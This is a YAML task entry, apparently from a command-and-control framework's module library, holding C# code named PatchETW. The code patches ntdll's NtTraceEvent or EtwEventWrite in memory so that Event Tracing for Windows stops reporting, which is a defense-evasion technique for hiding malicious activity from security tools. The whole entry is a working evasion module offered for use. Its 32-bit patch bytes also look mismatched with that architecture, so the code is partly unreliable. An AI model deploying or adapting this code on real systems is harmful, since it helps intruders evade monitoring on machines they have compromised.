- Name: PatchETW
  Aliases: []
  Author:
    Name: Chinedu Onwukike
    Handle: '@pytharmani'
    Link: https://github.com/py7hagoras
  Description: This patches ETW
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: "using System;\nusing System.Collections.Generic;\nusing System.Runtime.InteropServices;\nusing System.Text;\nusing System.Diagnostics;\nusing System.Linq;\nusing System.Security.Cryptography;\nusing System.Security.Principal;\n\n\n    public static class Task\n    {\n    \n    	[DllImport(\"kernel32\")]\n        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n\n        [DllImport(\"kernel32\")]\n        public static extern IntPtr LoadLibrary(string name);\n\n        [DllImport(\"kernel32\")]\n        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n        \n    	static string Message = \"Nothing yet\";\n    	public static string Execute ()\n        {\n        	if (is64Bit())\n            {\n            	PatchAddress(new byte[] { 0xc3, 0x00 }, \"ntdll.dll\", \"NtTraceEvent\");\n            } \n            else {\n            	PatchAddress(new byte[] { 0x48, 0xb8, 0xFF, 0xE0, 0x00 }, \"ntdll.dll\", \"EtwEventWrite\");\n            }\n\n            return Message;\n        }\n        \n        public static bool is64Bit()\n        {\n            bool is64Bit = true;\n\n            if (IntPtr.Size == 4)\n                is64Bit = false;\n\n            return is64Bit;\n        }\n    	\n        // https://github.com/passthehashbrowns/JoshC2/blob/ae75f0746b1977f13a8b10b89abf22b83cf7b41b/Implant/Evasion.cs\n        public static int PatchAddress(byte[] patch, string dll, string function)\n        {\n            try\n            {\n                uint oldProtect;\n\n                var loadDll = LoadLibrary(dll);\n                var etwEventSend = GetProcAddress(loadDll, function);\n\n                VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);\n                Marshal.Copy(patch, 0, etwEventSend, patch.Length);\n                Message = \"Successfully unhooked\";\n                return 0;\n            }\n            catch(Exception e)\n            {\n                Message = \"Error unhooking\";\n                return 1;\n            }\n           \n        }\n    }"
